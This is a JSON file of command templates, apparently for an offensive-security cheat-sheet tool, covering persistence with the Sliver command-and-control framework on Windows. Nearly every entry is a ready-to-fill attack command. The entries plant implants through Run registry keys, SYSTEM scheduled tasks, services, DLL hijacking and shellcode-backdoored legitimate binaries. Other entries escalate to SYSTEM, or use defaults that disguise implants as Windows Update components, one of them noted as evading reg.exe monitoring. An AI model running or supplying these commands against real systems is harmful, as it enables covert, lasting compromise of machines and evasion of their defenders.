{
  "title": "Sliver - Persistence",
  "commands": [
    {
      "args": [],
      "title": "Install SharPersist alias from Armory (prerequisite)",
      "template": "sliver> armory install sharpersist"
    },
    {
      "args": [
        {
          "name": "remote_path",
          "description": "Path to implant on target",
          "default": "C:\\Windows\\Temp\\updater.exe"
        },
        {
          "name": "reg_key",
          "description": "Registry key path",
          "default": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        },
        {
          "name": "value_name",
          "description": "Registry value name",
          "default": "WindowsUpdate"
        }
      ],
      "title": "Registry persistence via SharPersist (HKLM Run)",
      "description": "Requires admin privileges",
      "template": "sliver (session)> sharpersist -t reg -c \"{remote_path}\" -k \"{reg_key}\" -v \"{value_name}\" -m add"
    },
    {
      "args": [
        {
          "name": "remote_path",
          "description": "Path to implant on target",
          "default": "C:\\Windows\\Temp\\updater.exe"
        },
        {
          "name": "task_name",
          "description": "Scheduled task name",
          "default": "WindowsUpdateTask"
        }
      ],
      "title": "Scheduled task persistence via SharPersist",
      "description": "Creates a daily scheduled task running as SYSTEM",
      "template": "sliver (session)> sharpersist -t schtask -c \"{remote_path}\" -n \"{task_name}\" -m add"
    },
    {
      "args": [
        {
          "name": "remote_path",
          "description": "Path to implant on target",
          "default": "C:\\Windows\\Temp\\updater.exe"
        },
        {
          "name": "service_name",
          "description": "Service name",
          "default": "WindowsUpdateSvc"
        }
      ],
      "title": "Service persistence via SharPersist",
      "description": "Creates a Windows service running the implant",
      "template": "sliver (session)> sharpersist -t service -c \"{remote_path}\" -n \"{service_name}\" -m add"
    },
    {
      "args": [
        {
          "name": "remote_path",
          "description": "Path to implant on target",
          "default": "C:\\Windows\\Temp\\updater.exe"
        },
        {
          "name": "task_name",
          "description": "Scheduled task name",
          "default": "UpdaterTask"
        }
      ],
      "title": "Scheduled task persistence (native schtasks)",
      "description": "Creates a task that runs at system startup as SYSTEM",
      "template": "sliver (session)> execute -o schtasks /create /tn \"{task_name}\" /tr \"{remote_path}\" /sc onstart /ru SYSTEM"
    },
    {
      "args": [
        {
          "name": "remote_path",
          "description": "Path to implant on target",
          "default": "C:\\Windows\\Temp\\updater.exe"
        },
        {
          "name": "value_name",
          "description": "Registry value name",
          "default": "WindowsUpdate"
        }
      ],
      "title": "Registry Run persistence (native reg.exe)",
      "description": "Adds implant to HKCU Run registry key",
      "template": "sliver (session)> execute -o reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"{value_name}\" /t REG_SZ /d \"{remote_path}\""
    },
    {
      "args": [
        {
          "name": "remote_path",
          "description": "Path to implant on target",
          "default": "C:\\Windows\\Temp\\updater.exe"
        },
        {
          "name": "service_name",
          "description": "Service name",
          "default": "SliverSvc"
        }
      ],
      "title": "Service persistence (native sc.exe)",
      "description": "Creates and starts a Windows service running the implant",
      "template": "sliver (session)> execute -o sc create \"{service_name}\" binPath= \"{remote_path}\" start= auto && execute -o sc start \"{service_name}\""
    },
    {
      "args": [
        {
          "name": "target_dll_path",
          "description": "Path to DLL to hijack",
          "default": "C:\\Windows\\System32\\wlbsctrl.dll"
        },
        {
          "name": "local_dll_path",
          "description": "Local malicious DLL to upload",
          "default": "/tmp/evil.dll"
        }
      ],
      "title": "DLL hijack persistence",
      "description": "Plants a DLL for a hijack scenario (requires local DLL payload)",
      "template": "sliver (session)> upload {local_dll_path} {target_dll_path} && dllhijack {target_dll_path}"
    },
    {
      "args": [
        {
          "name": "remote_path",
          "description": "Path to implant on target",
          "default": "C:\\Windows\\Temp\\updater.exe"
        },
        {
          "name": "local_shellcode",
          "description": "Local shellcode file",
          "default": "/tmp/shellcode.bin"
        }
      ],
      "title": "Backdoor a legitimate binary with shellcode",
      "description": "Infects a remote file with Sliver shellcode",
      "template": "sliver (session)> upload {local_shellcode} {remote_path} && backdoor {remote_path} {remote_path}"
    },
    {
      "args": [
        {
          "name": "target_path",
          "description": "Path to backup existing binary and infect",
          "default": "C:\\Program Files\\SomeApp\\legit.exe"
        },
        {
          "name": "local_shellcode",
          "description": "Local shellcode file",
          "default": "/tmp/shellcode.bin"
        }
      ],
      "title": "Backdoor an existing binary (with backup)",
      "description": "Backups original, infects with shellcode (restore with backdoor -r)",
      "template": "sliver (session)> upload {local_shellcode} {local_shellcode} && backdoor -b .bak {target_path} {local_shellcode}"
    },
    {
      "args": [],
      "title": "Get SYSTEM privileges for persistence",
      "description": "Spawns a new session as SYSTEM (required for HKLM persistence)",
      "template": "sliver (session)> getsystem"
    },
    {
      "args": [
        {
          "name": "remote_path",
          "description": "Path to service implant on target",
          "default": "C:\\Windows\\Temp\\svc_implant.exe"
        }
      ],
      "title": "Install service via built-in psexec",
      "description": "Upload service-format implant and install as a service (admin required)",
      "template": "sliver (session)> upload /tmp/svc_implant.exe {remote_path} && psexec -d {remote_path}"
    },
    {
      "args": [
        {
          "name": "implant_path",
          "description": "Local path to implant binary",
          "default": "/tmp/beacon.exe"
        },
        {
          "name": "remote_path",
          "description": "Remote path to upload to",
          "default": "C:\\Windows\\Temp\\beacon.exe"
        }
      ],
      "title": "Upload implant to target (prerequisite for persistence)",
      "template": "sliver (session)> upload {implant_path} {remote_path}"
    },
    {
      "args": [
        {
          "name": "remote_path",
          "description": "Path to uploaded implant",
          "default": "C:\\Windows\\Temp\\beacon.exe"
        },
        {
          "name": "value_name",
          "description": "Registry value name",
          "default": "WindowsUpdate"
        }
      ],
      "title": "Registry persistence via built-in registry command",
      "description": "Uses Sliver's registry command (bypasses reg.exe monitoring)",
      "template": "sliver (session)> registry write --hive HKLM --path \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{value_name}\" --value \"{remote_path}\" --type string"
    }
  ]
}